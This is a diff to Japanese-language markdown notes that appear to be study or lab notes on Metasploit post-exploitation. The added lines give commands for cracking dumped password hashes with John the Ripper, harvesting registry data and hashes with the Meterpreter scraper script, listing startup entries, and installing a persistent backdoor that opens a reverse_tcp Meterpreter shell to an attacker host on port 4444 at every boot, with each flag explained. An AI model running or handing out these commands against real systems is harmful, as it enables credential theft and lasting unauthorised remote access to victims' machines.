@@ -119,9 +119,32 @@ getuid
 run hashdump
 ```
 
-### パスワード解析
-
 ```bash
+# パスワード解析
 john [パスワードファイルパス] --show
 john --wordlist=/usr/share/john/password.lst --format:nt .[パスワードファイルパス]
+```
+
+```bash
+# 通常ユーザのセッションを閉じておく。Windows側のプロセスからevil.exeが消える
+sessions -k 1
+
+# システム情報を収集（レジストリ、パスワードハッシュ等。時間がかかる）
+sessions 2
+run scraper
+```
+
+```bash
+# Meterpreterプロンプト→シェルに切り替える
+shell
+# 自動起動の内容を列挙
+wmic startup
+
+# 永続的なバックドアを設置
+run persistence -X -i 60 -P windows/meterpreter/reverse_tcp -p 4444 -r [ホストIP]
+# -X: システム起動時に自動開始
+# -i: 接続試行の間隔（秒）
+# -P: ペイロードを使用する
+# -p: ペイロード接続先ポート
+# -r: ペイロード接続先IP
 ```
